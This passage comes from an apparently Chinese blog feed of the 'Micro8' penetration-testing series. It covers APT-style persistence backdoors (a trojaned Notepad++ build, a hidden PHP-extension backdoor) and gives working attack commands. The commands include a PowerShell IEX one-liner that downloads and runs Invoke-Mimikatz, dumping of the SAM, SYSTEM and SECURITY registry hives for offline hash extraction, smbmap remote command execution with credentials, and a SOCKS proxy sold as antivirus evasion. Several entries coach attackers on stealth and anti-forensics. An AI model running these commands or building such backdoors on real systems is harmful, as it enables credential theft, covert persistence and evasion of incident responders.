</p><p>安全从业人员，其实至少一直在与传统后门对抗，比如最常见的webshell免杀与webshell过waf。应急中的样本取证查杀远控残留文件等。但是webshell，远控仅仅又是“backdoor”的其中一种。</p><p>这里按照上几季的风格继续引用几个概念，只有概念清晰，才能了解如何对抗。</p><p>1：安全从业人员为什么要了解后门？<br>防御是以市场为核心的，而不是以项目为核心。需要对抗的可能是黑产从业者的流量劫持相关<br>后门，或者是政治黑客的高持续渗透权限把控后门等。</p><p>2：攻击人员为什么要了解后门？<br>随着对抗传统后门的产品越来越成熟，由特征查杀，到行为查杀，到态势感知。到大数据联合特征溯源锁定，如何反追踪，是一个非常值得思考的问题。</p><p>3：后门与项目的关联是什么？<br>某项目，被入侵，应急并加固解决，若干天后，再次被入侵依然篡改为某博彩。导致安全从业人员，客户之间的问题。</p><p>4：后门与安全产品的关联是什么？<br>某客户购买某安全产品套装，在实战中，一般由非重点关注服务器迂回渗透到核心服务器来跨过安全产品监控，得到相关权限后，后门起到越过安全产品。它会涉及对其他附属安全产品的影响。如客户质疑：为什么我都买了你们的套装，还被入侵。并且这还是第二次了。</p><p>思维跳出以上4条，来看下进一年的部分相关安全事件：  </p><p><img src="../do/media/df3613fba39b2e12f4468efe53262e8f.jpg" alt></p><p><img src="../do/media/27fae96ce75d6b1614e5033ff285c4dc.jpg" alt></p><p><img src="../do/media/9585fc63c8b91af89f4bc83cf0731305.jpg" alt>  </p><p><img src="../do/media/397f5aed69e279eb6c30555f8225ee92.jpg" alt></p><p>思维跳出以上4条安全事件，这里再一次引入百度百科的APT的主要特性：</p><p><strong>——潜伏性：</strong>这些新型的攻击和威胁可能在用户环境中存在一年以上或更久，他们不断收集各种信息，直到收集到重要情报。而这些发动APT攻击的黑客目的往往不是为了在短时间内获利，而是把“被控主机”当成跳板，持续搜索，直到能彻底掌握所针对的目标人、事、物，所以这种APT攻击模式,实质上是一种“恶意商业间谍威胁”。</p><p><strong>——持续性：</strong>由于APT攻击具有持续性甚至长达数年的特征，这让企业的管理人员无从察觉。在此期间，这种“持续性”体现在攻击者不断尝试的各种攻击手段，以及渗透到网络内部后长期蛰伏。</p><p><strong>——锁定特定目标：</strong>针对特定政府或企业，长期进行有计划性、组织性的窃取情报行为,针对被锁定对象寄送几可乱真的社交工程恶意邮件，如冒充客户的来信,取得在计算机植入恶意软件的第一个机会。</p><p><strong>——安装远程控制工具：</strong>攻击者建立一个类似僵尸网络Botnet的远程控制架构，攻击者会定期传送有潜在价值文件的副本给命令和控制服务器(C&amp;C Server)审查。将过滤后的敏感机密数据，利用加密的方式外传。</p><p>一次针对特定对象，长期、有计划性渗透的本质是什么？窃取数据下载到本地，或者以此次渗透来达到变现目的。引用如图：</p><p><img src="../do/media/13f06d366af1efb0e2ca128107bbc7be.jpg" alt></p><p><img src="../do/media/4b3ab99681d5270a521d6c752b4104bb.jpg" alt></p><p>一次具有针对性的渗透，绝对不单单是以渗透DMZ区为主，重要资料一般在内网服务器区（包括但不限制于数据库服务器，文件服务器，OA服务器），与内网办公区（包括但不限制于个人机，开发机，财务区）等。而往往这样的高级持续渗透，不能是一气呵成，需要一定时间内，来渗透到资料所在区域。而这里其中一个重要的环节就是对后门的要求，在渗透期间内（包括但不限制于一周到月甚至到年）以保持后续渗透。<br>传统型的后门不在满足攻击者的需求，而传统型的木马后门，大致可分为六代：</p><p>第一代，是最原始的木马程序。主要是简单的密码窃取，通过电子邮件发送信息等，具备了木马最基本的功能。</p><p>第二代，在技术上有了很大的进步，冰河是中国木马的典型代表之一。</p><p>第三代，主要改进在数据传递技术方面，出现了ICMP等类型的木马，利用畸形报文传递数据，增加了杀毒软件查杀识别的难度。</p><p>第四代，在进程隐藏方面有了很大改动，采用了内核插入式的嵌入方式，利用远程插入线程技术，嵌入DLL线程。或者挂接PSAPI，实现木马程序的隐藏，甚至在Windows NT/2000下，都达到了良好的隐藏效果。灰鸽子和蜜蜂大盗是比较出名的DLL木马。</p><p>第五代，驱动级木马。驱动级木马多数都使用了大量的Rootkit技术来达到在深度隐藏的效果，并深入到内核空间的，感染后针对杀毒软件和网络防火墙进行攻击，可将系统SSDT初始化，导致杀毒防火墙失去效应。有的驱动级木马可驻留BIOS，并且很难查杀。</p><p>第六代，随着身份认证UsbKey和杀毒软件主动防御的兴起，黏虫技术类型和特殊反显技术类型木马逐渐开始系统化。前者主要以盗取和篡改用户敏感信息为主，后者以动态口令和硬证书攻击为主。PassCopy和暗黑蜘蛛侠是这类木马的代表。</p><p>以远控举例，远控最开始生成的RAT功能一体化（包括但不限制于文件传输，命令执行等），后衍生成生成RAT支持插件式来达到最终目的。</p><p>以上的几代包括以上远控共同点，以独立服务或者独立进程，独立端口等来到达目的。难以对抗目前的反病毒反后门程序。那么传统型后门权限维持就不能满足目前的需求。</p><p>以第二季的demo举例，它无自己的进程，端口，服务，而是借助notepad++（非dll劫持）来生成php内存shell（这个过程相当于插件生成），并且无自启，当服务器重启后，继续等待管理员使用notepad++，它属于一个AB链后门，由A-notepad生成B-shell，以B-shell去完成其他工作。如果继续改进Demo，改造ABC链后门，A负责生成，B负责清理痕迹，C负责工作呢?这是一个攻击者应该思考的问题。</p><p>而后门的主要工作有2点，1越过安全产品。2维持持续渗透权限。<br>文章的结尾，这不是一个notepad++的后门介绍，它是一个demo，一个类后门，一个具有源码可控类的后门。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>59、高级持续渗透-第三季关于后门补充二</title>
      <link href="/article/59_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%BA%8C.html"/>
      <url>/article/59_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%BA%8C.html</url>
      
        <content type="html"><![CDATA[<p><strong>前者的话：</strong>从第三季开始引入段子，让本枯燥的学术文章，也变得生动有趣。</p><p>第二季的Demo遵循人性五条来设计，回忆这其中五条：</p><p><strong>1：攻击方与防御方的本质是什么？</strong><br>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。  </p><p><strong>2：安全公司的本质是什么？</strong><br>盈利，最小投入，最大产出。  </p><p><strong>3：安全公司产品的本质是什么？</strong><br>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的客户）  </p><p><strong>4：安全人员的本质是什么？</strong><br>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。  </p><p><strong>5：对接客户的本质是什么？</strong><br>对接客户也是某公司内安全工作的一员，与概念4相同。  </p><p><strong>6:线索排查与反线索排查</strong><br>那么这个demo离可高级可持续性渗透后门还有一段距离，这里引入第六条“<strong>线索排查</strong>”与“<strong>反线索排查</strong>”，在第二季的demo中，它生成了一个名为micropoor.txt的文件，如果经验丰富的安全人员可根据时间差来排查日记，demo的工作流程大致是这样的，打开notepad++，生成micropoor.txt，写入内容，关闭文件流。根据线索排查，定位到notepad++，导致权限失控。</p><p>在线索排查概念中，这里要引入“ABC”类线索关联排查，当防御者在得到线索A，顺藤到B，最后排查到目标文件C，根据五条中的第一条，demo要考虑如何删除指定日志内容，以及其他操作。来阻止ABC类线索关联排查。</p><p><strong>不要思维固死在这是一个nontepad++后门的文章，它是一个面向类后门，面向的是可掌握源码编译的类后门。</strong>同样不要把思维固定死在demo中的例子，针对不同版本的NT系统，完全引用“powershell IEX (New-Object System.Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz”而关于bypass" target="_blank" rel="noopener">https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz”而关于bypass</a><br>UAC，已经有成熟的源码。或发送至远程或是写在本地的图片里，不要让知识，限制了后门的想象。这也正是第一季所说的：一个优秀的Microdoor是量身目标制定且一般不具备通用性的。是的，<strong>一般不具备通用性</strong>。</p><p>观看目前文章的一共有2类人，一类攻击方，一类防守方。假设一个场景，现在摆在你面前有一台笔记本，并且这台笔记本有明确的后门，你的任务，排查后门。我想所有人都会排查注册表，服务，端口，进程等。因为这些具备通用性，也同样具备通用性排查手段。</p><p>临近文章结尾，第三次引用：<strong>在后门的进化对抗中，rootkit也发生了变化，最大的改变是它的系统层次结构发生了变化。</strong>如果彻底理解了这段话。那么就要引用王健X爸爸的一句话：先定个小目标，控它个1825天。</p><p>/*<br>段子<br>*/</p><p>奈何厂商不重视后渗透攻击与持久性攻击，文章的结尾引用马X爸爸的一句话：厂商不改变，我们就改变厂商。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>58、高级持续渗透-第二季关于后门补充一</title>
      <link href="/article/58_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%8C%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%B8%80.html"/>
      <url>/article/58_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%8C%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%B8%80.html</url>
      
        <content type="html"><![CDATA[<p>这次继续围绕第一篇，第一季关于后门：<br><a href="https://micropoor.blogspot.hk/2017/12/php.html" target="_blank" rel="noopener">https://micropoor.blogspot.hk/2017/12/php.html</a><br>做整理与补充。在深入一步细化demo notepad++。</p><p>后门是渗透测试的分水岭，它分别体现了攻击者对目标机器的熟知程度，环境，编程语言，了解对方客户，以及安全公司的本质概念。这样的后门才能更隐蔽，更长久。</p><p>而对于防御者需要掌握后门的基本查杀，与高难度查杀，了解被入侵环境，目标机器。以及后门或者病毒可隐藏角落，或样本取证，内存取证。</p><p>所以说后门的安装与反安装是一场考试，一场实战考试。</p><p>这里要引用几个概念，只有概念清晰，才能把后门加入概念化，使其更隐蔽。</p><p><strong>1：攻击方与防御方的本质是什么？</strong><br>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。  </p><p><strong>2：安全公司的本质是什么？</strong><br>盈利，最小投入，最大产出。  </p><p><strong>3：安全公司产品的本质是什么？</strong><br>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的客户）  </p><p> <strong>4：安全人员的本质是什么？</strong><br>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。  </p><p><strong>5：对接客户的本质是什么？</strong><br>对接客户也是某公司内安全工作的一员，与概念4相同。</p><p>清晰了以上5个概念，作为攻击者，要首先考虑到对抗成本，什么样的对抗成本，能满足概念1-5。影响或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。</p><p>文章的标题既然为php安全新闻早八点，那么文章的本质只做技术研究，Demo本身不具备攻击或者持续控制权限功能。</p><h3 id="Demo连载第二季："><a href="#Demo连载第二季：" class="headerlink" title="Demo连载第二季："></a>Demo连载第二季：</h3><p>Demo 环境：windows 7 x64，notepad++(x64)<br>Demo IDE：vs2017</p><p>在源码中，我们依然修改每次打开以php结尾的文件，先触发后门，在打开文件。其他文件跳过触发后门。但是这次代码中加入了生成micropoor.txt功能。并且使用php来加载运行它，是的，生成一个txt。demo中，为了更好的演示，取消自动php加载运行该txt。<br>而txt的内容如图所示，并且为了更好的了解，开启文件监控。  </p><p><img src="../do/media/521fcd207c06f1ff3a490654d0e8d436.jpg" alt></p><p>使用notepad++(demo2).exe 打开以php结尾的demo.php，来触发microdoor。并且生成了micropoor.txt  </p><p><img src="../do/media/c2200632c4c4a168865aa7ef81f80420.jpg" alt>  </p><p><img src="../do/media/24da8061f9a5aa1c285d133acb1271d6.jpg" alt></p><p>而micropoor.txt内容：  </p><p><img src="../do/media/24dd00201a6a10fb3bf447c3ac703088.jpg" alt></p><p>配合micropoor.txt的内容，这次的Demo将会变得更有趣。</p><p><strong>那么这次demo 做到了，无服务，无进程，无端口，无自启。<br>根据上面的5条概念，加入到了demo中，增加对手成本。使其更隐蔽。</strong></p><p>如果demo不是notepad++，而是mysql呢?用它的端口，它的进程，它的服务，它的一切，来重新编译microdoor。  </p><p>例如：重新编译mysql.so,mysql.dll，替换目标主机。  </p><p>无文件，无进程，无端口，无服务，无语言码。因为一切附属于它。  </p><p>这应该是一个攻击者值得思考的问题。</p><p><strong>正如第一季所说：在后门的进化中，rootkit也发生了变化，最大的改变是它的系统层次结构发生了变化。</strong></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>57、高级持续渗透-第一季关于后门</title>
      <link href="/article/57_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html"/>
      <url>/article/57_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html</url>
      
        <content type="html"><![CDATA[<p>当我们接到某个项目的时候，它已经是被入侵了。甚至已经被脱库，或残留后门等持续攻击洗库。  </p><p>后渗透攻击者的本质是什么？<br>阻止防御者信息搜集，销毁行程记录，隐藏存留文件。  </p><p>防御者的本质是什么？<br>寻找遗留信息，发现攻击轨迹与样本残留并且阻断再次攻击。<br>那么这里攻击者就要引入“持续攻击”，防御者就要引入“溯源取证与清理遗留”，攻击与持续攻击的分水岭是就是后渗透持续攻击，而表现形式其中之一就是后门。</p><h3 id="后门的种类："><a href="#后门的种类：" class="headerlink" title="后门的种类："></a>后门的种类：</h3><ul><li>本地后门：如系统后门，这里指的是装机后自带的某功能或者自带软件后门  </li><li>本地拓展后门：如iis 6的isapi，iis7的 模块后门  </li><li>第三方后门：如apache，serv-u，第三方软件后门  </li><li>第三方扩展后门：如php扩展后门，apache扩展后门，第三方扩展后门  </li><li>人为化后门：一般指被动后门，由人为引起触发导致激活，或者传播</li></ul><p><strong>后门的隐蔽性排行：</strong>本地后门 &gt; 本地拓展后门 &gt; 第三方后门 &gt; 第三方扩展后门，这里排除人为化后门，一个优秀的人为化后门会造成的损失不可估计，比如勒索病毒的某些非联网的独立机器，也有被勒索中毒。在比如某微博的蠕虫等。</p><p><strong>整体概括分类为：</strong>主动后门，被动后门。传播型后门。  </p><p><strong>后门的几点特性：</strong>隐蔽，稳定。持久</p><p>一个优秀的后门，一定是具备几点特征的，无文件，无端口，无进程，无服务，无语言码，并且是量身目标制定且一般不具备通用性。</p><p>攻击者与防御者的本质对抗是什么？<br>增加对方在对抗中的时间成本，人力成本。</p><p>这里要引用百度对APT的解释：</p><blockquote><p>APT是指高级持续性威胁。利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式，APT攻击的原理相对于其他攻击形式更为高级和先进，其高级性主要体现在APT在发动攻击之前需要对攻击对象的业务流程和目标系统进行精确的收集。</p></blockquote><p>那么关于高级持续渗透后门与上面的解释类似：高级持续渗透后门是指高级持续性后渗透权限长期把控，利用先进的后渗透手段对特定目标进行长期持续性维持权限的后攻击形式，高级持续渗透后门的原理相对于其他后门形式更为高级和先进，其高级性主要体现在持续渗透后门在发动持续性权限维持之前需要对攻击对象的业务流程和目标系统进行精确的收集并量身制定目标后门。</p><p><strong>第一季从攻击者角度来对抗：</strong><br>项目中一定会接触到溯源，而溯源最重要的环节之一就是样本取证与分析。既然是样本取证，也就是主要找残留文件。可能是脚本，dll，so，exe等。其次是查找相关流量异常，端口，进程。异常日志。<br>做为攻击者的对抗，无开放端口，无残留文件，无进程，无服务。在防御者处理完攻击事件后的一定时间内，再次激活。</p><p>这里要解释一下rootkit，它的英文翻译是一种特殊类型的恶意软件。百度百科是这样解释的：</p><blockquote><p>Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系<br>统内核，进而达到隐藏信息的目的。</p></blockquote><p>在后门的进化中，rootkit也发生了变化，最大的改变是它的系统层次结构发生了变化。</p><h3 id="后门的生成大体分4类："><a href="#后门的生成大体分4类：" class="headerlink" title="后门的生成大体分4类："></a>后门的生成大体分4类：</h3><ol><li>有目标源码  </li><li>无目标源码  </li><li>无目标源码，有目标api</li><li>无目标源码，无api，得到相关漏洞等待触发</li></ol><p>结合后门生成分类来举例细说几个demo。</p><h2 id="1-有目标源码"><a href="#1-有目标源码" class="headerlink" title="1.有目标源码"></a>1.有目标源码</h2><p>目前大量服务器上有第三方软件。这里以notepad++为例。</p><p>Notepad++是Windows操作系统下的一套文本编辑器，有完整的中文化接口及支持多国语言编写的功能，并且免费开源。  </p><p>开源项目地址：<a href="https://github.com/notepad-plus-plus/notepad-plus-plus" target="_blank" rel="noopener">https://github.com/notepad-plus-plus/notepad-plus-plus</a>  </p><p>关于编译：<a href="https://micropoor.blogspot.hk/2017/12/1notepad.html" target="_blank" rel="noopener">https://micropoor.blogspot.hk/2017/12/1notepad.html</a></p><p>Demo 环境：windows 7 x64，notepad++(x64) Demo IDE：vs2017</p><p>在源码中，我们修改每次打开以php结尾的文件，先触发后门，在打开文件。其他文件跳过触发后门。</p><p><img src="../do/media/b728495422dc9915124be66a66da50e1.jpg" alt></p><p><img src="../do/media/aa988aa25e0775c44406aba58faf47bd.jpg" alt></p><p>文件被正常打开。  </p><p><img src="../do/media/64d1aa65870e4498663a3f67b6578dc7.jpg" alt></p><p><img src="../do/media/0ea7113c6f35a874d4962ba9f33ca037.jpg" alt></p><p><strong>优点：</strong>在对抗反病毒，反后门软件中有<strong>绝对优势</strong>，可本地多次调试，稳定性强壮。跨平台能力非常强壮，并且可以对后门选择方式任意，如主动后门，被动后门，人为化后门等。  </p><p><strong>缺点：</strong>针对性较强，需要深入了解目标服务器安装或使用软件。需要语言不确定的语言基础。在封闭系统，如Windows下多出现于第三方开源。</p><h3 id="2-无目标源码"><a href="#2-无目标源码" class="headerlink" title="2.无目标源码"></a>2.无目标源码</h3><p>参考内部分享第九课</p><p><strong>优点：</strong>在对抗反病毒，反后门软件中有<strong>一定优势</strong>，稳定性<strong>良好</strong>，跨平台能力一般，并且适用于大多数可操作文件，同样可以选择对后门选择方式任意，如主动后门，被动后门，人为化后门等。  </p><p><strong>缺点：</strong>稳定性<strong>不突出</strong>，在修改已生成的二进制文件，容易被<strong>反病毒</strong>，<strong>反后门</strong>软件查杀。</p><h3 id="3-无目标源码，有目标api"><a href="#3-无目标源码，有目标api" class="headerlink" title="3.无目标源码，有目标api"></a>3.无目标源码，有目标api</h3><p>目前大多数的Ms_server，内置iis，从windows2000开始，而目前国内市场使用03sp2，08r2为主。在win下又以iis为主，在iis中目前主要分为iis5.x，iis6.x，大于等于iis7.x。iis7以后有了很大的变化，尤其引入模块化体系结构。iis6.x最明显的是内置IUSR来进行身份验证，IIS7中，每个身份验证机制都被隔离到自己的模块中，或安装或卸载。<br>同样，目前国内市场另一种常见组合XAMP（WIN+Apche+mysql+php，与Linux+Apche+mysql+php)，php5.x与php7.x有了很大的变化，PHP7将基于最初由Zend开发的PHPNG来改进其框架。并且加入新功能，如新运算符，标记，对十六进制的更友好支持等。</p><p>Demo 环境：windows 7x86 php5.6.32<br>Demo IDE：vs2017<br>php默认有查看加载扩展，命令为php -m，有着部分的默认扩展，而在扩展中，又可以对自己不显示在扩展列表中</p><p><img src="../do/media/b2b341e62db3bf91bd8762c7112b84ed.jpg" alt></p><p>php.ini 配置  </p><p><img src="../do/media/749a9e60168a7928f3a7afa1e7fc633a.jpg" alt></p><p>以Demo.php为例，demo.php代码如下：</p><p><img src="../do/media/3856a8d4054fc6fc5c436689673a0784.jpg" alt></p><p><img src="../do/media/e4c92d9ccd30bcd0c5d7d9d257714d28.jpg" alt></p><p>在访问demo.php，post带有触发后门特征，来执行攻击者的任意php代码。在demo中，仅仅是做到了，无明显的以php后缀为结尾的后门，那么结合第一条，有目标源码为前提，来写入其他默认自带扩展中，来达到更隐蔽的作用。</p><p><strong>优点：</strong>在对抗反病毒，反后门软件中有<strong>绝对优势</strong>，可本地多次调试，稳定性<strong>非常强壮</strong>。跨平台能力非常强壮，且可以对后门选择方式任意，如主动后门，被动后门，人为化后门等。  </p><p><strong>缺点：</strong>在编译后门的时候，需要查阅大量API，一个平台到多个平台的相关API。调试头弄，失眠，吃不下去饭。领导不理解，冷暖自知。</p><p><strong>第二季从防御者角度来对抗。</strong></p><blockquote><p>  后者的话：<br>目前国内市场的全流量日志分析，由于受制于存储条件等因素，大部分为全流量，流量部分分析。那么在高级持久性后门中，如何建立一个伪流量非实用数据来逃逸日志分析，这应该是一个优秀高级持续后门应该思考的问题。</p></blockquote><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>56、离线提取目标机hash</title>
      <link href="/article/56_%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash.html"/>
      <url>/article/56_%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash.html</url>
      
        <content type="html"><![CDATA[<p>很多环境下，不允许上传或者使用 mimikatz。而针对非域控的单机离线提取 hash 显得尤为重要。</p><p>在 meterpreter shell 命令切到交互式 cmd 命令。<br><img src="../do/media/647ac3d1d83b7d7711b2cfd0ce18f1d5.jpg" alt></p><p>reg save 方式使得需要下载的目标机hash文件更小。  </p><ul><li>reg save HKLM\SYSTEM sys.hiv  </li><li>reg save HKLM\SAM sam.hiv  </li><li>reg save hklm\security security.hiv  </li></ul><p><img src="../do/media/cebaa1fc93231bc1aaf7738c222b5ac6.jpg" alt></p><p><img src="../do/media/f2dc08a2bd64fc29ec0189933b4442dc.jpg" alt></p><p>meterpreter下自带download功能。  </p><p><img src="../do/media/336cd95e4be157c266efcd04d9ddc064.jpg" alt></p><p><img src="../do/media/3f2d037ed7ac0197c01e95b7651fad41.jpg" alt></p><h3 id="离线提取："><a href="#离线提取：" class="headerlink" title="离线提取："></a>离线提取：</h3><p>本季用到的是 impacket 的  secretsdump.py。Kali默认路径：<code>/root/impacket/examples/secretsdump.py</code></p><p><strong>命令如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL</span><br></pre></td></tr></table></figure><p><img src="../do/media/ced7254cc160ced11f2f3f512df53aec.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>55、与Smbmap结合攻击</title>
      <link href="/article/55_%E4%B8%8ESmbmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB.html"/>
      <url>/article/55_%E4%B8%8ESmbmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB.html</url>
      
        <content type="html"><![CDATA[<p>msf 在配合其它框架攻击，可补充 msf 本身的不足以及强化攻击方式，优化攻击线路。本季将会把 msf 与 Smbmap 结合攻击。弥补 msf 文件搜索以及文件内容搜索的不足。</p><p>项目地址：<a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener">https://github.com/ShawnDEvans/smbmap</a></p><ul><li>支持传递哈希  </li><li>文件上传/下载/删除  </li><li>可枚举（可写共享，配合Metasploit）  </li><li>远程命令执行  </li><li>支持文件内容搜索  </li><li>支持文件名匹配（可以自动下载）  </li><li>msf配合Smbmap攻击需要使用到sock4a模块</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(server/socks4a) &gt; show options</span><br></pre></td></tr></table></figure><p><img src="../do/media/f7b132114e46760984cd298213740f4d.jpg" alt></p><p>该模块socks4a加入job</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(server/socks4a) &gt; jobs</span><br></pre></td></tr></table></figure><p><img src="../do/media/c38221c680e3e078414ebb4cfe8ecb66.jpg" alt></p><p>配置proxychains，做结合攻击铺垫。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# cat /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="../do/media/9fb4144cb5b4c7825b4ad698f740f3f5.jpg" alt>  </p><p><img src="../do/media/33f8922e2c8e134f96f3ca546e96c420.jpg" alt></p><p>支持远程命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp\# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐x &apos;net user&apos;</span><br></pre></td></tr></table></figure><p><img src="../do/media/0d745135d03f66c1ec9bc97c844730f5.jpg" alt>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐x &apos;whoami&apos;</span><br></pre></td></tr></table></figure><p><img src="../do/media/c7d86f93c68a049ada011d3067384b07.jpg" alt></p><p>枚举目标机共享</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐d ABC</span><br></pre></td></tr></table></figure><p><img src="../do/media/e28af8ca88f58bb38cf7e10087ab35d6.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root\@John:/tmp\# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐x &apos;ipconfig&apos;</span><br></pre></td></tr></table></figure><p><img src="../do/media/123a8b0a7824f57dd5a78f5861b8baea.jpg" alt></p><p>Smbmap支持IP段的共享枚举，当然Smbmap还有更多强大的功能等待探索。</p><blockquote><p>Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>54、基于Powershell做Socks4-5代理</title>
      <link href="/article/54_%E5%9F%BA%E4%BA%8EPowershell%E5%81%9ASocks4-5%E4%BB%A3%E7%90%86.html"/>
      <url>/article/54_%E5%9F%BA%E4%BA%8EPowershell%E5%81%9ASocks4-5%E4%BB%A3%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<p><strong>连载2：</strong><br>在上一篇连载中讲到powershell可无缝来调.net framework。而在实战中，内网的代理尤其重要，如常见的端口转发被反病毒软件盯死。本章无图，其他同学如有环境测试，可补图。</p><p>介绍 github：<br><a href="https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1" target="_blank" rel="noopener">https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1</a></p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p><strong>Create a Socks 4/5 proxy on port 1234:</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1 </span><br><span class="line">Invoke-SocksProxy -bindPort 1234</span><br></pre></td></tr></table></figure><p><strong>Create a simple tcp port forward:</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-PortFwd -bindPort 33389 -destHost 127.0.0.1 -destPort 3389</span><br></pre></td></tr></table></figure><p>可目前过大部分反病毒软件。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>53、内网渗透中的文件传输</title>
      <link href="/article/53_%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.html"/>
      <url>/article/53_%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.html</url>
      
